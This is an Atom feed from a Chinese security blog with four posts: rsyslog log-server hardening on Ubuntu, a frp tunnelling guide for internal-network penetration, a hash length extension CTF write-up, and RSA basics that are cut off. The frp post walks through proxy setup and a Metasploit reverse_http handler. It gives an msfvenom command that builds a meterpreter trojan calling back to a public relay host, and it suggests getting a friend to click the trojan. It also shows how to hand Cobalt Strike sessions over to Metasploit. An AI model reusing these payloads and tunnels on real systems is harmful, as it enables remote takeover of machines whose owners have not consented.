<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Goudan&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://goudanjun.vip/"/>
  <updated>2021-04-17T05:59:39.504Z</updated>
  <id>http://goudanjun.vip/</id>
  
  <author>
    <name>狗蛋菌</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ubuntu18 加固</title>
    <link href="http://goudanjun.vip/2021/04/17/ubuntu18-%E5%8A%A0%E5%9B%BA.html/"/>
    <id>http://goudanjun.vip/2021/04/17/ubuntu18-加固.html/</id>
    <published>2021-04-17T05:45:19.000Z</published>
    <updated>2021-04-17T05:59:39.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="建立同步日志服务器"><a href="#建立同步日志服务器" class="headerlink" title="建立同步日志服务器"></a>建立同步日志服务器</h1><h2 id="服务端（保存日志的服务器）"><a href="#服务端（保存日志的服务器）" class="headerlink" title="服务端（保存日志的服务器）"></a>服务端（保存日志的服务器）</h2><h3 id="安装Rsyslog"><a href="#安装Rsyslog" class="headerlink" title="安装Rsyslog"></a>安装Rsyslog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install rsyslog -y</span><br><span class="line">rsyslogd -v  <span class="comment">#查看是否安装成功</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/17/UJQvCpyjl3I6R4r.png" alt="image-20210417134922553"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">systemctl start rsyslog <span class="comment">#启动服务</span></span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line"><span class="comment"># /etc/rsyslog.conf</span></span><br><span class="line"><span class="comment">#取消以下的注释</span></span><br><span class="line"><span class="variable">$ModLoad</span> imudp</span><br><span class="line"><span class="variable">$UDPServerRun</span> 514</span><br><span class="line"><span class="variable">$ModLoad</span> imtcp</span><br><span class="line"><span class="variable">$InputTCPServerRun</span> 514</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义特定的子网，IP或域以限制访问</span></span><br><span class="line"><span class="variable">$AllowedSender</span> TCP, 127.0.0.1, 192.168.0.0/24, *.example.com</span><br><span class="line"><span class="variable">$AllowedSender</span> UDP, 127.0.0.1, 192.168.0.0/24, *.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个模板来告诉Rsyslog服务器如何存储传入的syslog消息。在GLOBAL DIRECTIVES部分之前添加以下行</span></span><br><span class="line"><span class="variable">$template</span> remote-incoming-logs,<span class="string">"/var/log/%HOSTNAME%/%PROGRAMNAME%.log"</span> </span><br><span class="line">*.* ?remote-incoming-logs</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存完之后，检查Rsyslog配置是否存在语法错误</span></span><br><span class="line">rsyslogd -f /etc/rsyslog.conf -N1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/17/GZou1wBmNaK9ScH.png" alt="image-20210417135320365"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重启Rsyslog服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"><span class="comment">#验证Rsyslog是否正在侦听 TCP/UDP</span></span><br><span class="line">netstat -4altunp | grep 514</span><br></pre></td></tr></table></figure><h2 id="客户端（需要保存日志的服务器）"><a href="#客户端（需要保存日志的服务器）" class="headerlink" title="客户端（需要保存日志的服务器）"></a>客户端（需要保存日志的服务器）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改配置文件 </span></span><br><span class="line"><span class="comment"># /etc/rsyslog.conf</span></span><br><span class="line"><span class="comment">#在末尾加入如下行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##Enable sending of logs over UDP add the following line:</span></span><br><span class="line">*.* @192.168.0.101:514</span><br><span class="line"><span class="comment">##Enable sending of logs over TCP add the following line:</span></span><br><span class="line">*.* @@192.168.0.101:514</span><br><span class="line"><span class="comment">##Set disk queue when rsyslog server will be down:</span></span><br><span class="line"><span class="variable">$ActionQueueFileName</span> queue</span><br><span class="line"><span class="variable">$ActionQueueMaxDiskSpace</span> 1g</span><br><span class="line"><span class="variable">$ActionQueueSaveOnShutdown</span> on</span><br><span class="line"><span class="variable">$ActionQueueType</span> LinkedList</span><br><span class="line"><span class="variable">$ActionResumeRetryCount</span> -1</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存并关闭文件。然后，重新启动Rsyslog服务器以应用配置更改：</span></span><br><span class="line">systemtcl restart rsyslog</span><br></pre></td></tr></table></figure><p>这时在服务器端的 /var/log 目录下有有一个主机名字的文件</p><p><img src="https://i.loli.net/2021/04/17/aIe9y2kU1NZKfrq.png" alt="image-20210417135818034"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;建立同步日志服务器&quot;&gt;&lt;a href=&quot;#建立同步日志服务器&quot; class=&quot;headerlink&quot; title=&quot;建立同步日志服务器&quot;&gt;&lt;/a&gt;建立同步日志服务器&lt;/h1&gt;&lt;h2 id=&quot;服务端（保存日志的服务器）&quot;&gt;&lt;a href=&quot;#服务端（保存日志的服务器
      
    
    </summary>
    
    
      <category term="ubuntu" scheme="http://goudanjun.vip/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf</title>
    <link href="http://goudanjun.vip/2021/04/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8Bfrp%EF%BC%9A%E7%AE%80%E5%8D%95%E4%BB%A3%E7%90%86%E3%80%81msf%E5%8F%8D%E5%BC%B9shell%E3%80%81CS%E8%81%94%E5%8A%A8msf.html/"/>
    <id>http://goudanjun.vip/2021/04/13/内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf.html/</id>
    <published>2021-04-13T08:26:19.000Z</published>
    <updated>2021-04-13T08:33:48.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章介绍如何使用frp建立端口转发实现本地kali在公网ssh、本地msf在公网反弹shell；已经上线CS怎么联动本地msf</p><a id="more"></a><h2 id="frp基础"><a href="#frp基础" class="headerlink" title="frp基础"></a>frp基础</h2><h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1. 下载"></a>1. 下载</h3><p><a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">下载地址</a></p><p>linux版在kali用，windows版在/ps用</p><p><img src="https://i.loli.net/2021/04/13/SPzOlwyQftYe9VA.jpg" alt="1617202234_60648c3a0050ec60a2dcd.png!small?1617202235480"></p><h3 id="2-kali设置代理"><a href="#2-kali设置代理" class="headerlink" title="2. kali设置代理"></a>2. kali设置代理</h3><blockquote><p>vi /etc/proxychains4.conf</p><p>socks5 1.166.166.6 7777</p></blockquote><p><img src="https://i.loli.net/2021/04/13/CzukQwom2YnVfMg.jpg" alt="1617215199_6064bedf5f59e9b428c66.png!small"></p><p>使用的时候可以在命令前加proxychains</p><p><img src="https://i.loli.net/2021/04/13/9tfvkp2edINrBJL.jpg" alt="1617215347_6064bf73c7e51e10ae652.png!small"></p><h3 id="3-msf设置代理"><a href="#3-msf设置代理" class="headerlink" title="3. msf设置代理"></a>3. msf设置代理</h3><blockquote><p>setg Proxies socks5:1.166.166.6:7777<br>setg ReverseAllowProxy true</p></blockquote><p><img src="https://i.loli.net/2021/04/13/IVGTyeigsz4aoln.jpg" alt="1617215456_6064bfe04a14e5b3fc06b.png!small"></p><h3 id="4-windows设置代理"><a href="#4-windows设置代理" class="headerlink" title="4. windows设置代理"></a>4. windows设置代理</h3><p>使用Proxifier工具</p><h2 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h2><p><img src="https://i.loli.net/2021/04/13/HiXYm4Srvgo5Qku.jpg" alt="1617214945_6064bde1165815b2561e5.png!small?1617214946554"></p><h3 id="1-PS配置服务端frps-ini"><a href="#1-PS配置服务端frps-ini" class="headerlink" title="1. /PS配置服务端frps.ini"></a>1. /PS配置服务端frps.ini</h3><blockquote><p>[common]<br>bind_addr = 0.0.0.0<br>bind_port = 7000</p></blockquote><p>运行</p><blockquote><p>frps.exe -c frps.ini</p></blockquote><h3 id="2-内网机器配置客户端frpc-ini"><a href="#2-内网机器配置客户端frpc-ini" class="headerlink" title="2. 内网机器配置客户端frpc.ini"></a>2. 内网机器配置客户端frpc.ini</h3><blockquote><p># frpc.ini<br>[common]<br>server_addr = 1.166.166.6<br>server_port = 7000<br>[http_proxy]<br>type = tcp<br>remote_port = 7777<br>plugin = socks5</p></blockquote><p>运行</p><blockquote><p>frpc.exe -c frpc.ini</p></blockquote><h3 id="3-使用代理"><a href="#3-使用代理" class="headerlink" title="3. 使用代理"></a>3. 使用代理</h3><h2 id="ssh端口转发、msf反弹shell的端口转发—代理配置"><a href="#ssh端口转发、msf反弹shell的端口转发—代理配置" class="headerlink" title="ssh端口转发、msf反弹shell的端口转发—代理配置"></a>ssh端口转发、msf反弹shell的端口转发—代理配置</h2><p>在环境中，/PS起到了桥梁的作用，使得两个内网可以相互通信</p><h3 id><a href="#" class="headerlink" title></a><img src="https://i.loli.net/2021/04/13/Vzsymxck5jCBtYo.jpg" alt="1617214123_6064baab156b2d5027b22.png!small?1617214124585"></h3><h3 id="1-环境描述"><a href="#1-环境描述" class="headerlink" title="1. 环境描述"></a>1. 环境描述</h3><p>1.1 攻击目标内网</p><p>1.2 攻击桥梁/PS(windows)，ip：1.166.166.6</p><p>1.3 本地机器kali linux，ip：10.1.0.4</p><p>1.4 工具：frp</p><h3 id="2-服务端配置"><a href="#2-服务端配置" class="headerlink" title="2. 服务端配置"></a>2. 服务端配置</h3><p>/PS为服务端，假设ip为1.166.166.6</p><p>将下载的文件放在/ps，编辑frps.ini文件配置</p><p><img src="https://i.loli.net/2021/04/13/C6NlMurK1a2cIpO.jpg" alt="1617202982_60648f26e7bc70af0cda8.png!small?1617202984398"></p><blockquote><p>[common]</p><p>bind_port = 60121<br>dashboard_port = 88<br>dashboard_user = admin<br>dashboard_pwd = zcv2!#sWE3x</p></blockquote><p>参数说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common] # 名字</span><br><span class="line">bind_port = port # 指的是frp的服务端端口，用来和客户端kali建立连接</span><br><span class="line">dashboard_port = port # 可视化监控平台的端口，访问这个端口会得到一个网页版的监控</span><br><span class="line"># http://1.166.166.6:88</span><br><span class="line">dashboard_user = admin # 网页版的登录用户名</span><br><span class="line">dashboard_pwd = zcv2!#sWE3x # 网页版的登录密码</span><br></pre></td></tr></table></figure><p>配置好之后保存，进行运行</p><blockquote><p>frps.exe -c frps.ini</p></blockquote><p><img src="https://i.loli.net/2021/04/13/qClJU7ZSWN3hszB.jpg" alt="1617203561_60649169bdb8bb105bb50.png!small?1617203563291"></p><h3 id="3-客户端配置"><a href="#3-客户端配置" class="headerlink" title="3. 客户端配置"></a>3. 客户端配置</h3><p>将文件放进kali，解压命令</p><blockquote><p>tar -zxvf frp_0.36.2_linux_amd64.tar.gz</p></blockquote><p><img src="https://i.loli.net/2021/04/13/GSqBpxsRliXMn8g.jpg" alt="1617203431_606490e706d991b42b56f.png!small?1617203432602"></p><p>配置kali，让在本地内网的kali，也能使用公网的IP进行访问，客户端的配置文件为frpc.ini</p><p><img src="https://i.loli.net/2021/04/13/fZ38ur9Ub7BlTWm.jpg" alt="1617203104_60648fa00814bc6a39dfc.png!small?1617203105472"></p><blockquote><p>[common]<br>server_addr = 1.166.166.6<br>server_port = 60121</p><p>[ssh]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 22<br>remote_port = 60122<br>use_compression = true</p><p>[msf]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 1234<br>remote_port = 60123</p></blockquote><p>参数说明</p><blockquote><p>[common]名称<br>server_addr = 1.166.166.6 # 服务器IP<br>server_port = 60121 # /PS的端口，用来建立连接</p><p>[ssh] # 配置ssh登录的端口转发<br>type = tcp # 连接方式为TCP的方式<br>local_ip = 127.0.0.1 # 将本地的IP映射出去<br>local_port = 22 # 本地的端口为22<br>remote_port = 60122 # 映射的端口为60122，本地端口22映射到/PS的60122<br>use_compression = true</p><p>[msf] # 配置msf的监听端口转发<br>type = tcp # 连接方式<br>local_ip = 127.0.0.1 # 本地IP<br>local_port = 1234 # 监听本地的端口<br>remote_port = 60123  # 映射的/PS端口为60123，本地端口1234映射到/PS的60123</p></blockquote><p>在kali中运行</p><blockquote><p>./frpc -c frpc.ini</p></blockquote><p><img src="https://i.loli.net/2021/04/13/oUzEY1Ml7p3P9XF.jpg" alt="1617203501_6064912d4332fa79c03d1.png!small?1617203502691"></p><h3 id="4-访问一下frp的web管理页面"><a href="#4-访问一下frp的web管理页面" class="headerlink" title="4. 访问一下frp的web管理页面"></a>4. 访问一下frp的web管理页面</h3><p>访问<a href="http://1.166.166.6:88，输入用户名密码登录" target="_blank" rel="noopener">http://1.166.166.6:88，输入用户名密码登录</a></p><p><img src="https://i.loli.net/2021/04/13/H5186rlnh3wCEck.jpg" alt="1617203679_606491dfd67ce3d4555ab.png!small?1617203681427"></p><p>可以观察到流量的情况</p><p><img src="https://i.loli.net/2021/04/13/1jPK5VLzWaISEfB.jpg" alt="1617203683_606491e3b25f666a603e3.png!small?1617203685175"></p><h3 id="5-测试效果"><a href="#5-测试效果" class="headerlink" title="5. 测试效果"></a>5. 测试效果</h3><p>ssh远程kali，前提是kali开启了远程连接</p><p><img src="https://i.loli.net/2021/04/13/q32CYkmidRF6JIl.jpg" alt="1617204648_606495a8049b097ff6369.png!small?1617204649522"></p><h2 id="CS联动MSF"><a href="#CS联动MSF" class="headerlink" title="CS联动MSF"></a>CS联动MSF</h2><p>将CS已上线的机器进行反弹到本地MSF</p><h3 id="1-在CS中新建一个监听"><a href="#1-在CS中新建一个监听" class="headerlink" title="1. 在CS中新建一个监听"></a>1. 在CS中新建一个监听</h3><p><img src="https://i.loli.net/2021/04/13/s6jekU91tymLIQF.jpg" alt="1617204994_60649702113b8ebba537c.png!small?1617204995585"></p><p><img src="https://i.loli.net/2021/04/13/u82Xrs4qjaGzTOR.jpg" alt="1617204997_60649705174373b5bdeb0.png!small?1617204999116"></p><p>点击Save保存</p><h3 id="2-kali-msf设置监听"><a href="#2-kali-msf设置监听" class="headerlink" title="2. kali msf设置监听"></a>2. kali msf设置监听</h3><p>由于上面frpc.ini配置的msf的1234端口映射到/ps的60123</p><p>所以应该监听本地的1234端口，这里要写reverse_http，与CS对应</p><blockquote><p>msfconsole -x “use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j; “</p></blockquote><p><img src="https://i.loli.net/2021/04/13/zHjobKv2dVirXmB.jpg" alt="1617205228_606497ecbaf46a5a6892b.png!small?1617205230658"></p><h3 id="3-CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF"><a href="#3-CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF" class="headerlink" title="3. CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF"></a>3. CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF</h3><p><img src="https://i.loli.net/2021/04/13/7SMZeBLXTs1CcNb.jpg" alt="1617205629_6064997d0cadb310fdca0.png!small?1617205630471"></p><p><img src="https://i.loli.net/2021/04/13/y3NMhSCxas4PVpJ.jpg" alt="1617205631_6064997f7eeca600dda26.png!small?1617205632899"></p><p>MSF上线！</p><p><img src="https://i.loli.net/2021/04/13/nJq9cajT14t3NHV.jpg" alt="1617205658_6064999a5d0711fcf0775.png!small?1617205659790"></p><p><img src="https://i.loli.net/2021/04/13/5BXATuni6fgzLGU.jpg" alt="1617205697_606499c106349e5d4caef.png!small?1617205698447"></p><h2 id="内网MSF反弹内网shell"><a href="#内网MSF反弹内网shell" class="headerlink" title="内网MSF反弹内网shell"></a>内网MSF反弹内网shell</h2><h3 id="1-生成msf木马"><a href="#1-生成msf木马" class="headerlink" title="1. 生成msf木马"></a>1. 生成msf木马</h3><blockquote><p>msfvenom -p windows/meterpreter/reverse_http LHOST=1.166.166.6 LPORT=60123 -f exe &gt; zf.exe</p></blockquote><p>因为生成的木马由内网机器运行，内网机器只能访问/PS，不能直接访问本地的kali，所以LHOST是/ps，LPORT也是kali映射到/ps的端口</p><h3 id="2-设置监听"><a href="#2-设置监听" class="headerlink" title="2. 设置监听"></a>2. 设置监听</h3><p>这里和CS联动msf的时候一样</p><p>设置监听的时候要考虑：1234是本地监听的端口，60123是/ps的端口，60123的数据转发到kali的1234</p><blockquote><p>msfconsole -x “use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j; “</p></blockquote><h3 id="3-找一个小伙伴的电脑点一下木马"><a href="#3-找一个小伙伴的电脑点一下木马" class="headerlink" title="3. 找一个小伙伴的电脑点一下木马"></a>3. 找一个小伙伴的电脑点一下木马</h3><p>kali上线</p><p><img src="https://i.loli.net/2021/04/13/7qCw1dmz3YstVBu.jpg" alt="1617206873_60649e59100485fe74cf3.png!small?1617206874508"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内网渗透中隧道时必不可少的，frp搭建隧道相对比较稳定，功能也更加强大，常用的还有EW，都可以进行多级代理</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://cn-sec.com/archives/80364.html" target="_blank" rel="noopener">http://cn-sec.com/archives/80364.html</a></p><p><a href="https://www.freebuf.com/articles/web/268234.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/268234.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章介绍如何使用frp建立端口转发实现本地kali在公网ssh、本地msf在公网反弹shell；已经上线CS怎么联动本地msf&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网" scheme="http://goudanjun.vip/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="隧道" scheme="http://goudanjun.vip/tags/%E9%9A%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="http://goudanjun.vip/2021/03/20/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB.html/"/>
    <id>http://goudanjun.vip/2021/03/20/hash长度扩展攻击.html/</id>
    <published>2021-03-20T02:17:25.000Z</published>
    <updated>2021-03-20T02:45:08.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hash加密过程："><a href="#hash加密过程：" class="headerlink" title="hash加密过程："></a><strong>hash加密过程：</strong></h1><p>hash加密类似于分组加密算法，每次会处理固定长度的信息（MD5是64bit）</p><a id="more"></a><p><img src="https://i.loli.net/2021/03/20/5eCjP7tJXahuxpc.png" alt="img"></p><h1 id="MD5加密："><a href="#MD5加密：" class="headerlink" title="MD5加密："></a><strong>MD5加密：</strong></h1><ol><li>首先需要将要进行message的填充，将message填充成为64的倍数（实际只需要填充到 <strong>length%64 = 56(Byte)</strong>即可，因为<strong>最后8字节</strong>是表示<strong>message的长度</strong>，MD5算法会自动添加）</li><li>进行分组 ( 一组64bit ) 加密，每一组的信息会和<strong>前一组计算得出的iv向量</strong>进行一系列的复杂运算得到一个hash值和一组iv向量，如果第一组正好是64位，则第一组计算即可得出hash值。</li><li>其中第一组加密的初始iv为固定值</li></ol><p><img src="https://i.loli.net/2021/03/20/yKmLkOgHpiEW7Nb.png" alt="img"></p><p>例如：</p><p>对admin进行MD5加密：</p><ol><li><p>message = admin</p></li><li><p>padding</p></li><li><ol><li>一个\x80</li><li>N个\x00</li></ol></li><li><p>填充后：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure><ol><li>hex(admin) + ‘80’ + 50*’00’ + ‘2800000000000000’</li><li>后8字节 (64bit / 16位hex ) 实际上是：’0000000000000028’，填充的时候要按小端存储，逆序存储，admin是5个字节，40bit，即十六进制的28</li><li>最后分组进行MD5加密</li></ol><h1 id="hash长度扩展攻击："><a href="#hash长度扩展攻击：" class="headerlink" title="hash长度扩展攻击："></a><strong>hash长度扩展攻击：</strong></h1><p>需要知道：salt的长度 + message的值 + salt和message经过MD5加密后的字符串 + 我们要扩充的字符串</p><p>一般在实际应用中，例如在cookie或session中加密传输用户名和密码时，服务器管理员为了提高数据的混淆度，会加上在本来的message前加上一段固定长度的盐值（salt），防止恶意用户截取到用户名或密码可以直接MD5加密预测cookie或session，从而冒充用户进行登陆。因为有了salt所以我们不能直接猜测出cookie或session，这就有了hash长度扩展攻击：</p><p>本来的加密过程是：</p><blockquote><p><strong>原始被MD5加密的字符串</strong> = salt + message + padding + length</p></blockquote><p>我们可以将原来的 salt+message+padding+length 看作是一个新的 salt’ 再加上我们要扩充的字符串 ( message’ ) ，计算出一个新的MD5值</p><blockquote><p><strong>新的被MD5加密的字符串</strong> = salt’ + message’ + padding’ + length’</p><p>length’ = lenth( salt + message + padding + message’)</p></blockquote><p><img src="https://i.loli.net/2021/03/20/JfsqFPIrgmzHZUn.png" alt="img"></p><p>例如：</p><p>已知原始消息为admin，salt的长度为4，要扩展的字符串是 ‘joychou’，计算 padding’ ， length’  和 新生成的MD5</p><p>hex(admin) = 61646d696e</p><p>hex(salt) = xxxxxxxx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始被MD5加密的字符串 = xxxxxxxx61646d696e80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 </span><br><span class="line">hex($salt) + hex(&apos;admin&apos;) + &apos;80&apos; +  54*&apos;00&apos;</span><br></pre></td></tr></table></figure><p>len(‘原始被MD5加密的字符串’) = 64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新的被MD5加密的字符串 = 原始被MD5加密的字符串 + hex(&apos;joychou&apos;) + 80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 + 3802000000000000 </span><br><span class="line">新的length = len(原始被MD5加密的字符串 + &apos;joychou&apos;) = 71(Byte) = 568(bit) = 0x238 </span><br><span class="line">padding&apos;= 800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003802000000000000</span><br></pre></td></tr></table></figure><p>新生成的MD5：06cf5a94dcda53659f58c0f411ba0bd8</p><p><strong>CTF例题：</strong></p><p>题目连接： <a href="http://daka.whaledu.com/web/web44/答案格式：whaleCTF{xxxx}" target="_blank" rel="noopener">http://daka.whaledu.com/web/web44/</a></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"已知一组role为admin，salt长度为4，hash为c7813629f22b6a7d28a08041db3e80a9,想要扩展的字符串是joychou"</span>.<span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">$flag = <span class="string">"**********"</span>; </span><br><span class="line">$role = $_REQUEST[<span class="string">"role"</span>]; </span><br><span class="line">$hash = $_REQUEST[<span class="string">"hash"</span>]; </span><br><span class="line">$salt = <span class="string">"***********"</span>; <span class="comment">//The length is 4 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($hash !== md5($salt.$role))&#123; <span class="comment">//这里判断加盐后的新生成的MD5和输入的MD5是否相等，若相等则可输出flag，这里就可用到我们的hash长度扩展攻击</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong!'</span>;      </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $role == <span class="string">'admin'</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'no no no !, hash cann\'t be admin'</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//echo "You are ".$role.'&lt;/br&gt;'; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Congradulation! The flag is'</span>.$flag; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用自动填充脚本：</p><p><img src="https://i.loli.net/2021/03/20/3xptnaC8QDvymRB.png" alt="img"></p><p>使用方法：</p><p>python md5pad.py 已知的MD5值 需要扩展的字符串 原message和salt的长度</p><p><img src="https://i.loli.net/2021/03/20/BE4NP6g1ybmIWSl.png" alt="img"></p><p>通过burp抓包，在post请求包的data中赋值并发送即可得到flag</p><p><img src="https://i.loli.net/2021/03/20/oDwjXI9s54Or3Ez.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;hash加密过程：&quot;&gt;&lt;a href=&quot;#hash加密过程：&quot; class=&quot;headerlink&quot; title=&quot;hash加密过程：&quot;&gt;&lt;/a&gt;&lt;strong&gt;hash加密过程：&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;hash加密类似于分组加密算法，每次会处理固定长度的信息（MD5是64bit）&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="http://goudanjun.vip/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>RSA加密</title>
    <link href="http://goudanjun.vip/2021/03/18/RSA%E5%8A%A0%E5%AF%86.html/"/>
    <id>http://goudanjun.vip/2021/03/18/RSA加密.html/</id>
    <published>2021-03-18T07:48:54.000Z</published>
    <updated>2021-03-23T02:07:46.435Z</updated>
    
    <content type="html"><![CDATA[<p>RSA</p><a id="more"></a><h1 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a><strong>加密过程：</strong></h1><p><img src="https://i.loli.net/2021/03/18/r1ihTuDgwcKkmqP.png" alt="img"></p><p><img src="https://i.loli.net/2021/03/18/lvua4LNxADb7SdB.png" alt="img"></p><p>例如：</p><p><img src="https://i.loli.net/2021/03/18/dpAwK1HEi4beznh.png" alt="img"></p><p>e:公钥，d:私钥</p><p><strong>加密过程：</strong></p><p><img src="https://i.loli.net/2021/03/18/RzVHjDNY5iGWEgJ.png" alt="img"></p><p>例子：</p><p>明文M = 19</p><p>密文C = (19^5) mod 119 = 66</p><p>公钥e = 5</p><p>私钥d = 77</p><p>n = 119</p><p>66^77 mod 119 = ? 19</p><h1 id="手工计算RSA加密："><a href="#手工计算RSA加密：" class="headerlink" title="手工计算RSA加密："></a><strong>手工计算RSA加密：</strong></h1><p><img src="https://i.loli.net/2021/03/18/42VHAu3MQCOch1K.png" alt="img"></p><p>计算：66^77 mod 119</p><p>1，</p><p>​    77 = 0b100 1101</p><p>​    0：前一位^2 mod 119</p><p>​    1：（直接平方再乘原始的66） mod 119</p><p>2，</p><table><thead><tr><th align="center">1</th><th align="center">0</th><th align="center">0</th><th align="center">1</th><th align="center">1</th><th align="center">0</th><th align="center">1</th></tr></thead><tbody><tr><td align="center">66</td><td align="center">72</td><td align="center">67</td><td align="center">83</td><td align="center">94</td><td align="center">30</td><td align="center">19</td></tr></tbody></table><p>可用脚本：</p><p><img src="https://i.loli.net/2021/03/18/U4EyHhqag8dzcJu.png" alt="img"></p><p><img src="https://i.loli.net/2021/03/18/65oPBSgIL1J9hcz.png" alt="img"></p><p>​    </p><h1 id="RSA应用："><a href="#RSA应用：" class="headerlink" title="RSA应用："></a><strong>RSA应用：</strong></h1><p><img src="https://i.loli.net/2021/03/18/Tbtm3xhGWiIFpZ6.png" alt="img"></p><h2 id="whaleCTF"><a href="#whaleCTF" 